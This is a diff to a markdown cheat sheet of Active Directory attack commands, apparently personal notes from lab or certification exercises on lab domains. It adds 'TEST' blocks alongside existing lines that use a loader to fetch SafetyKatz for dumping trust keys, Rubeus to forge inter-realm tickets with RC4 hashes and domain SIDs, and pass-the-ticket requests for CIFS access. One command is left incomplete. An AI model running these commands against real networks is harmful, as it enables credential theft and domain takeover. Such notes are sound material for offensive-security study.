@@ -52,12 +52,26 @@ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 conne
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
 ```
 
+TEST
+```powershell
+f112ca3fdde9210caf7335939d95c191
+
+Rubeus.exe -args evasive-silver /service:krbtgt/painters.htb /rc4:0198d3872de6e6c0978af7ebe2d8d495 /sid:S-1-5-21-1470357062-2280927533-300823338 /ldap /user:Administrator /nowrap
+```
+
 Create interrealm ticket - `sid` = current domain
 ```powershell
 C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:0198d3872de6e6c0978af7ebe2d8d495 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
 ```
 
 > **Note:** Can only access resources that were explicitly shared with you
+
+
+TEST
+```powershell
+C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgs /service:cifs/ZPH-SVRDC01.zsm.local /dc:ZPH-SVRDC01.zsm.local /ptt /ticket:
+```
+
 
 Import ticket to access shared resources
 ```powershell
